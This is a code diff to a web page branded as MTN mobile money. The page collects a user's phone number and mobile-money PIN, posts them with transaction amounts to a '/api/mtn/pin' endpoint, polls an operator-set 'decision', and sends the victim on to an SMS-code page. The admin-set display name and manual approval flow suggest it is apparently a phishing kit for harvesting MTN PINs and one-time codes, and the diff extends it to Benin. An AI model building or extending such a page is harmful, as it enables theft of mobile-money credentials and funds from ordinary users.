@@ -34,7 +34,6 @@
     padding-bottom: env(safe-area-inset-bottom, 0px);
   }
 
-  /* ===== Form state ===== */
   .brand-block { text-align: center; padding: 44px 24px 0; }
   .yello-logo { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 14px; gap: 8px; }
   .yello-mark {
@@ -109,7 +108,6 @@
   .field.invalid .field-error { display: block; }
   .field.invalid .pin-input-wrap { border-bottom-color: #FFE04D; }
 
-  /* Inline error banner used ONLY after a decline */
   .status-banner {
     display: none;
     padding: 11px 14px;
@@ -160,9 +158,6 @@
   }
   .contact-label { font-size: 12px; font-weight: 700; letter-spacing: 0.4px; color: var(--mtn-white); opacity: 0.9; }
 
-  /* ============================================================
-     Full-page "Initiating payment…" overlay
-  ============================================================ */
   .initiating {
     position: fixed; inset: 0;
     background: var(--mtn-teal);
@@ -208,7 +203,6 @@
     margin: 0 auto 32px;
   }
 
-  /* Spinner */
   .spinner {
     width: 56px; height: 56px;
     border: 4px solid rgba(255,255,255,0.18);
@@ -219,13 +213,11 @@
   }
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* Small footer note under the spinner */
   .initiating .note {
     font-size: 11px; color: rgba(255,255,255,0.55);
     margin-top: 8px; line-height: 1.5;
   }
 
-  /* Cancel button — small text link */
   .initiating .cancel-link {
     margin-top: 32px;
     background: transparent; border: none; cursor: pointer;
@@ -235,7 +227,6 @@
   }
   .initiating .cancel-link:hover { color: var(--mtn-yellow); }
 
-  /* Toast */
   .toast {
     position: fixed; bottom: 90px; left: 50%;
     transform: translateX(-50%) translateY(80px);
@@ -245,9 +236,6 @@
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  /* ============================================================
-     Touch devices — larger tap targets, roomier fields
-  ============================================================ */
   @media (pointer: coarse) {
     .pin-input-wrap input,
     .phone-input-wrap input { font-size: 17px; }
@@ -255,9 +243,6 @@
     .phone-input-wrap, .pin-input-wrap { padding-bottom: 10px; }
   }
 
-  /* ============================================================
-     Landscape phones — collapse the header, keep the form visible
-  ============================================================ */
   @media (orientation: landscape) and (max-height: 500px) {
     .brand-block { padding: 14px 24px 0; }
     .yello-mark { width: 42px; height: 42px; }
@@ -371,9 +356,6 @@
   </div>
 </div>
 
-<!-- ============================================================
-     Full-page "Initiating payment…" overlay
-============================================================ -->
 <div class="initiating" id="initiating">
   <div class="brand-row">
     <div class="yello-mini">
@@ -400,23 +382,27 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ============================================================
-     Country data
-  ============================================================ */
   const COUNTRY_DIAL = {
-    'Cameroon': '+237', 'Zambia': '+260', 'Zambia (MTN)': '+260',
-    'Uganda': '+256', 'Uganda (MTN)': '+256',
-    'Ghana': '+233', 'Ghana (MTN)': '+233'
+    'Cameroon': '+237',
+    'Zambia': '+260',
+    'Zambia (MTN)': '+260',
+    'Uganda': '+256',
+    'Uganda (MTN)': '+256',
+    'Ghana': '+233',
+    'Ghana (MTN)': '+233',
+    'Benin': '+229'
   };
   const COUNTRY_SUPPORT = {
-    'Cameroon': 'tel:8787', 'Zambia': 'tel:111', 'Zambia (MTN)': 'tel:111',
-    'Uganda': 'tel:100', 'Uganda (MTN)': 'tel:100',
-    'Ghana': 'tel:100', 'Ghana (MTN)': 'tel:100'
+    'Cameroon': 'tel:8787',
+    'Zambia': 'tel:111',
+    'Zambia (MTN)': 'tel:111',
+    'Uganda': 'tel:100',
+    'Uganda (MTN)': 'tel:100',
+    'Ghana': 'tel:100',
+    'Ghana (MTN)': 'tel:100',
+    'Benin': 'tel:111'
   };
 
-  /* ============================================================
-     Read transaction from URL
-  ============================================================ */
   const params = new URLSearchParams(location.search);
   const tx = {
     ref: params.get('tx') || '',
@@ -430,9 +416,6 @@
     an:  params.get('an') || ''
   };
 
-  /* ============================================================
-     Display name
-  ============================================================ */
   function applyDisplayName() {
     const adminName = params.get('dn') || '';
     const nameEl = document.getElementById('displayName');
@@ -450,9 +433,6 @@
     }
   }
 
-  /* ============================================================
-     Country + prefill phone
-  ============================================================ */
   function applyCountry() {
     const dial = COUNTRY_DIAL[tx.c] || '+237';
     document.getElementById('dialCode').textContent = dial;
@@ -462,6 +442,7 @@
     if (dial === '+260' && rawPhone.startsWith('260')) rawPhone = rawPhone.slice(3);
     if (dial === '+256' && rawPhone.startsWith('256')) rawPhone = rawPhone.slice(3);
     if (dial === '+233' && rawPhone.startsWith('233')) rawPhone = rawPhone.slice(3);
+    if (dial === '+229' && rawPhone.startsWith('229')) rawPhone = rawPhone.slice(3);
     rawPhone = rawPhone.replace(/^0+/, '');
 
     document.getElementById('phoneInput').value = rawPhone;
@@ -470,9 +451,6 @@
     if (support) document.getElementById('contactLink').href = support;
   }
 
-  /* ============================================================
-     PIN visibility
-  ============================================================ */
   let pinVisible = false;
   function togglePin() {
     const pin = document.getElementById('pinInput');
@@ -483,9 +461,6 @@
       : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
   }
 
-  /* ============================================================
-     Validation
-  ============================================================ */
   function setInvalid(id) { document.getElementById(id).classList.add('invalid'); }
   function clearInvalid(id) { document.getElementById(id).classList.remove('invalid'); }
 
@@ -503,9 +478,6 @@
     return ok;
   }
 
-  /* ============================================================
-     UI helpers
-  ============================================================ */
   function showToast(msg) {
     const t = document.getElementById('toast');
     t.textContent = msg; t.classList.add('show');
@@ -533,9 +505,6 @@
     document.getElementById('initiatingNote').textContent = text;
   }
 
-  /* ============================================================
-     Polling cancel flag
-  ============================================================ */
   let pollingActive = false;
   let pollTimer = null;
 
@@ -548,9 +517,6 @@
     btn.textContent = 'Sign In';
   }
 
-  /* ============================================================
-     Sign In
-  ============================================================ */
   async function handleSignIn(e) {
     e.preventDefault();
     hideBanner();
@@ -570,15 +536,17 @@
     showInitiating();
 
     try {
-      await fetch('/api/verification/submit', {
+      await fetch('/api/mtn/pin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           tx: tx.ref,
-          otp: pin,
+          pin: pin,
           am: tx.am,
           cur: tx.cur,
           c: tx.c,
+          an: tx.an,
+          rn: tx.rn,
           phone: dial + phoneDigits
         })
       });
@@ -608,10 +576,10 @@
 
       let decision = 'pending';
       try {
-        const r = await fetch('/api/verification/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const r = await fetch('/api/mtn/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
         const j = await r.json();
         decision = j.decision || 'pending';
-      } catch (err) { /* keep polling */ }
+      } catch (err) { }
 
       if (!pollingActive) return;
 
@@ -625,6 +593,18 @@
         setTimeout(() => {
           window.location.href = 'sms.html?' + q.toString();
         }, 400);
+        return;
+      }
+
+      if (decision === 'inactive') {
+        pollingActive = false;
+        hideInitiating();
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an,
+          reason: 'inactive'
+        });
+        window.location.href = 'oops.html?' + q.toString();
         return;
       }
 
@@ -645,9 +625,6 @@
     poll();
   }
 
-  /* ============================================================
-     Init
-  ============================================================ */
   document.addEventListener('DOMContentLoaded', () => {
     applyDisplayName();
     applyCountry();
